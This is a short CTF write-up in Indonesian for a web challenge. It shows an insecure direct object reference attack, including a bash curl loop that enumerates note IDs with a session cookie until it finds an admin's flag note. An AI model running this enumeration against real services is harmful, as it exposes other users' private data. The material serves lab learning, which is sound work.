This repository shows the documentation and write up for my work at POROS' Final CTF Stage.

**Web Exploitation**

**[493 pts] he made a statement
Author: zenc**

Saat membuka 10.34.9.91:7001, masuk ke login page dan diberikan informasi login:
Username: user
Password: userpass
Setelah login, akan di-direct ke page dashboard dengan semua catatan dan ID-nya namun tidak semua ID-nya ada, seperti 2, 3, 5, 7, 8, dst. 
Pertama saya mencoba mengakses notes yang ID-nya tidak ditampilkan, seperti 2, 3, 5, 7, 8, dst. Lalu ada 1 ID (41) yang berbeda karena ownernya adalah admin dan notenya flag, namun flag palsu

Karena sudah menemukan hal seperti ini, saya lanjutkan hingga ID 100 dengan command: for i in $(seq 51 100); do
  result=$(curl -s -b cookies.txt "http://10.34.9.91:7001/note.php?id=$i")
  owner=$(echo "$result" | grep -o "Owner: [^<]*")
  note=$(echo "$result" | grep -o "class=\"note\">[^<]*" | cut -d'>' -f2)
  if [ -n "$note" ]; then
    echo "ID $i | $owner | $note"
  fi
Done

Lalu ditemukan: 

ID-67, owner admin, dan flag sebagai notesnya
Jika dilihat langsung dari webnya dan masukkan URL sesuai ID 67 yaitu http://54.252.114.9:8080/note.php?id=67, flag juga akan muncul


**Flag 
PorosCTF{34sy_a5_fuck_1dor_wait_f0r_th3_0thers_llmnx}**
